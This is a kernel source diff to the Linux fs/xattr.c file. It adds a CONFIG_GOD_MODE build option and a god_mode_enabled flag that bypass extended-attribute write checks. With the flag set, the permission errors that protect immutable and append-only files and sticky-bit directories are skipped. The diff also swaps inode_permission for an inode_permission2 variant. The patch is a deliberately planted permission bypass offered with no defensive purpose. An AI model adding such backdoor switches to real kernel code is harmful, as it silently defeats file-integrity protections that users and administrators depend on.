@@ -1,3 +1,6 @@
+#ifdef CONFIG_GOD_MODE
+#include <linux/god_mode.h>
+#endif
 /*
   File: fs/xattr.c
 
@@ -36,7 +39,15 @@ xattr_permission(struct inode *inode, const char *name, int mask)
 	 */
 	if (mask & MAY_WRITE) {
 		if (IS_IMMUTABLE(inode) || IS_APPEND(inode))
-			return -EPERM;
+			
+#ifdef CONFIG_GOD_MODE
+{
+ if (!god_mode_enabled)
+#endif
+return -EPERM;
+#ifdef CONFIG_GOD_MODE
+}
+#endif
 	}
 
 	/*
@@ -66,10 +77,18 @@ xattr_permission(struct inode *inode, const char *name, int mask)
 			return (mask & MAY_WRITE) ? -EPERM : -ENODATA;
 		if (S_ISDIR(inode->i_mode) && (inode->i_mode & S_ISVTX) &&
 		    (mask & MAY_WRITE) && !inode_owner_or_capable(inode))
-			return -EPERM;
+			
+#ifdef CONFIG_GOD_MODE
+{
+ if (!god_mode_enabled)
+#endif
+return -EPERM;
+#ifdef CONFIG_GOD_MODE
+}
+#endif
 	}
 
-	return inode_permission(inode, mask);
+	return inode_permission2(ERR_PTR(-EOPNOTSUPP), inode, mask);
 }
 
 /**
